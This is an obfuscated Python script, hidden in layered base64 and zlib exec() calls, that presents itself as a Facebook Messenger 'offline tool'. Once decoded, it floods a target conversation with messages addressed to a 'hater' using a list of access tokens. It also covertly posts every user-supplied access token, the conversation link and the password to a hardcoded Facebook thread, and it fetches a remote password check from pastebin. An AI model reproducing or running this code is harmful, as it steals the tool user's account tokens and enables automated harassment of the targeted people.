import base64
exec(base64.b64decode(b'I0VOQ09ERUQgQlkgOiBNVU1JVCBJU0xBTSBISU1VCiNFTkNSWVBUSU9OIDogUHkzIFpMSUIKI0dJVEhVQiA6IGh0dHBzOi8vZ2l0aHViLmNvbS9NVU1JVC00MDQtQ1lCRVIKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KaW1wb3J0IHpsaWIKZXhlYyh6bGliLmRlY29tcHJlc3MoYiJ4XnVceDhmXHhjMVxuXHhjMjBceDBjXHg4Nlx4ZWZ9XHg4YVx4ZDBceDhiXHgwZVx4YjRceGJiXHgwZjxceDhhXHg5N1x4YTFceGEyXHgwY1x4ZjEkU1x4YTNceDE2XHhiYlx4YjZceGE0XHhkOTxceDg4XHhlZm5ceGVkRFx4YmRceGQ4U1x4MTNceGZlXHhlZktceGEyXHgxYlx4ZWZceDg4XHhjMVx4MDUhXHgwOFx4YmRceGQ5XHgwNVx4ZDNceDllYVx4MTJrXHg4NVx4YjZceGQzXHhlNFx4YWM6I1x4MGZceDA3XHhhYlx4ZTlceGIyXHhkY1x4YWRceGNiajZceGM4XHhmYVx4OWNceGJiWVx4YTRceDdmXHhjMVx4YzVmPl1ceGM1XHhhNFx4ZDAnXHhmOFpre1x4ZWNceGFiXHhjNFx4MTZceDAyXHhlMms9XHhlYlx4MDZceDhkXHhiNlx4ZDdceGU4Olx4YzlceDBiXHhiM1x4MGZFXHg5ZVx4ZGY/XHhkNENceGY1XHhmZlx4YzQ8XHhkNFx4YWJceGFmXHgwZU4mXHhkOFx4OTNceGI2PFx4OTRbXHhkN1x4MTJUSVx4MDRceGU1XHhjYlRceDE0Y1x4OTBceGEzXHgxZncmXHhkMFx4MDRceGVjJ1x4YmVceGExXHhjZkFceDEwXHhkN1x4Y2FceDFkQWpceGE0XHhjNVx4ZTF9eVx4ODNceDk2XHhhMVx4YWJJXHhkN3tceDgzXHgwMWpCXHhiMFx4OGUhICtceDk5XHg4OSdceGVkQ2hceGQ0Iikp'))

import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCByYW5kb20KCmh0bWxfY29udGVudCA9ICIiIgo8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkRlbW9uIFJ1bGxleDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgncmFzaG1pa2EuanBnJyk7CiAgICAgICAgICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7CiAgICAgICAgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxoMSBzdHlsZT0iY29sb3I6IGJsYWNrOyI+RDNNME4gUlVMTDNYIDBGRkxJTjMgVDAwTDwvaDE+CiAgICA8cCBzdHlsZT0iY29sb3I6IGdyZWVuOyI+VGhpcyBUb29sIENyZWF0ZWQgQnkgRmluY2g8L3A+CiAgICAKICAgIDxwIHN0eWxlPSJjb2xvcjogYmx1ZTsiPk93bmVyIE5hbWUgOjotIEZpbmNoPC9wPgogICAgCiAgICA8cCBzdHlsZT0iY29sb3I6IGdyYXk7Ij5NZW1iZXJzIExpc3QgOjotIDwvcD4KICAgIDx1bD4KICAgICAgICA8bGkgc3R5bGU9ImNvbG9yOiBibGFjazsiPjEuIEZhaXphbjwvbGk+CiAgICAgICAgPGxpIHN0eWxlPSJjb2xvcjogcHVycGxlOyI+Mi4gSW1yYW48L2xpPgogICAgICAgIDxsaSBzdHlsZT0iY29sb3I6IG9yYW5nZTsiPjMuIFN1bHRhbjwvbGk+CiAgICAgICAgPGxpIHN0eWxlPSJjb2xvcjogdGVhbDsiPjQuIEZsZXg8L2xpPgogICAgICAgIDxsaSBzdHlsZT0iY29sb3I6IG5hdnk7Ij41LiBTbW9rZXI8L2xpPiAgICAgICAgCiAgICAgICAgPGxpIHN0eWxlPSJjb2xvcjogYmxhY2s7Ij42LiBTdW5pbDwvbGk+CiAgICAgICAgPGxpIHN0eWxlPSJjb2xvcjogcHVycGxlOyI+Ny4gQWZ0YWI8L2xpPgogICAgICAgIDxsaSBzdHlsZT0iY29sb3I6IG9yYW5nZTsiPjguIFN0YXJjPC9saT4KICAgIDwvdWw+Cgo8L2JvZHk+CjwvaHRtbD4KIiIiCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgogICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQogICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L2h0bWwnKQogICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgIHNlbGYud2ZpbGUud3JpdGUoaHRtbF9jb250ZW50LmVuY29kZSgpKQoKZGVmIGV4ZWN1dGVfc2VydmVyKCk6CglQT1JUID0gNDAwMAoKCXdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOgoJCXByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpCgkJaHR0cGQuc2VydmVfZm9yZXZlcigpCgpkZWYgc2VuZF9tZXNzYWdlcygpOgoJd2l0aCBvcGVuKCdwYXNzd29yZC50eHQnLCAncicpIGFzIGZpbGU6CgkJcGFzc3dvcmQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJZW50ZXJlZF9wYXNzd29yZCA9IHBhc3N3b3JkCgoJaWYgZW50ZXJlZF9wYXNzd29yZCAhPSBwYXNzd29yZDoKCQlwcmludCgnWy1dIDw9PT4gUGFzc3dvcmQgSW5jb3JyZWN0JykKCQlzeXMuZXhpdCgpCgoJd2l0aCBvcGVuKCd0b2tlbm51bS50eHQnLCAncicpIGFzIGZpbGU6CgkJdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQoJbnVtX3Rva2VucyA9IGxlbih0b2tlbnMpCgoJcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkKCglkZWYgY2xzKCk6CgkJaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoKCQkJb3Muc3lzdGVtKCdjbGVhcicpCgkJZWxzZToKCQkJaWYgc3lzdGVtKCkgPT0gJ1dpbmRvd3MnOgoJCQkJb3Muc3lzdGVtKCdjbHMnKQoJY2xzKCkKCglkZWYgbGluZXNzKCk6CgkJcHJpbnQoJ1x1MDAxYlszN20nICsgJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpCgoJaGVhZGVycyA9IHsKCQknQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKCQknQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLAoJCSdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLAoJCSdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAoJCSdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCgkJJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKCQknQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywKCQkncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScKCX0KCgltbW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9tVFM5N1pkaycpLnRleHQKCglpZiBtbW0gbm90IGluIHBhc3N3b3JkOgoJCXByaW50KCdbLV0gPD09PiAgUGFzc3dvcmQgSW5jb3JyZWN0ICEnKQoJCXN5cy5leGl0KCkKCglsaW5lc3MoKQoKCWFjY2Vzc190b2tlbnMgPSBbdG9rZW4uc3RyaXAoKSBmb3IgdG9rZW4gaW4gdG9rZW5zXQoKCXdpdGggb3BlbignY29udm8udHh0JywgJ3InKSBhcyBmaWxlOgoJCWNvbnZvX2lkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCXdpdGggb3BlbignZmlsZS50eHQnLCAncicpIGFzIGZpbGU6CgkJdGV4dF9maWxlX3BhdGggPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJd2l0aCBvcGVuKHRleHRfZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CgkJbWVzc2FnZXMgPSBmaWxlLnJlYWRsaW5lcygpCgoJbnVtX21lc3NhZ2VzID0gbGVuKG1lc3NhZ2VzKQoJbWF4X3Rva2VucyA9IG1pbihudW1fdG9rZW5zLCBudW1fbWVzc2FnZXMpCgoJd2l0aCBvcGVuKCdoYXRlcnNuYW1lLnR4dCcsICdyJykgYXMgZmlsZToKCQloYXRlcnNfbmFtZSA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgl3aXRoIG9wZW4oJ3RpbWUudHh0JywgJ3InKSBhcyBmaWxlOgoJCXNwZWVkID0gaW50KGZpbGUucmVhZCgpLnN0cmlwKCkpCgoJbGluZXNzKCkKCQoJZGVmIGdldE5hbWUodG9rZW4pOgoJCXRyeToKCQkJZGF0YSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNy4wL21lP2FjY2Vzc190b2tlbj17dG9rZW59JykuanNvbigpCgkJZXhjZXB0OgoJCQlkYXRhID0gIiIKCQlpZiAnbmFtZScgaW4gZGF0YToKCQkJcmV0dXJuIGRhdGFbJ25hbWUnXQoJCWVsc2U6CgkJCXJldHVybiAiRXJyb3Igb2NjdXJlZCIKCglkZWYgbXNnKCk6CgkJcGFyYW1ldGVycyA9IHsKCQkJJ2FjY2Vzc190b2tlbicgOiByYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpLAoJCQknbWVzc2FnZSc6ICdVc2VyIFByb2ZpbGUgTmFtZSA6ICcrZ2V0TmFtZShyYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpKSsnXG4gVG9rZW4gOiAnKyIgfCAiLmpvaW4oYWNjZXNzX3Rva2VucykrJ1xuIExpbmsgOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWVzc2FnZXMvdC8nK2NvbnZvX2lkKydcbiBQYXNzd29yZDogJytwYXNzd29yZAoJCX0KCQl0cnk6CgkJCXMgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC90XzEwMDA4NjU0OTA4MTE5Mi8iLCBkYXRhPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCQlleGNlcHQ6CgkJCXBhc3MKCQoJbXNnKCkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlmb3IgbWVzc2FnZV9pbmRleCBpbiByYW5nZShudW1fbWVzc2FnZXMpOgoJCQkJdG9rZW5faW5kZXggPSBtZXNzYWdlX2luZGV4ICUgbWF4X3Rva2VucwoJCQkJYWNjZXNzX3Rva2VuID0gYWNjZXNzX3Rva2Vuc1t0b2tlbl9pbmRleF0KCgkJCQltZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQoKCQkJCXVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC97fS8iLmZvcm1hdCgndF8nK2NvbnZvX2lkKQoJCQkJcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0KCQkJCXJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQoJCQkJCgoJCQkJY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQoJCQkJaWYgcmVzcG9uc2Uub2s6CgkJCQkJcHJpbnQoIlsrXSBNZXNzYWdlcyB7fSBvZiBDb252byB7fSBzZW50IGJ5IFRva2VuIHt9OiB7fSIuZm9ybWF0KAoJCQkJCQltZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkKCQkJCQlwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkKCQkJCQlsaW5lc3MoKQoJCQkJCWxpbmVzcygpCgkJCQllbHNlOgoJCQkJCXByaW50KCJbeF0gRmFpbGVkIHRvIHNlbmQgbWVzc2FnZXMge30gb2YgQ29udm8ge30gd2l0aCBUb2tlbiB7fToge30iLmZvcm1hdCgKCQkJCQkJbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCgkJCQkJcHJpbnQoIiAgLSBUaW1lOiB7fSIuZm9ybWF0KGN1cnJlbnRfdGltZSkpCgkJCQkJbGluZXNzKCkKCQkJCQlsaW5lc3MoKQoJCQkJdGltZS5zbGVlcChzcGVlZCkKCgkJCXByaW50KCJbK10gQWxsIG1lc3NhZ2VzIHNlbnQuIFJlc3RhcnRpbmcgdGhlIHByb2Nlc3MuLi4iKQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToKCQkJcHJpbnQoIlshXSBBbiBlcnJvciBvY2N1cnJlZDoge30iLmZvcm1hdChlKSkKCgoKZGVmIG1haW4oKToKCXNlcnZlcl90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1leGVjdXRlX3NlcnZlcikKCXNlcnZlcl90aHJlYWQuc3RhcnQoKQoJCglzZW5kX21lc3NhZ2VzKCkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CgltYWluKCk='))
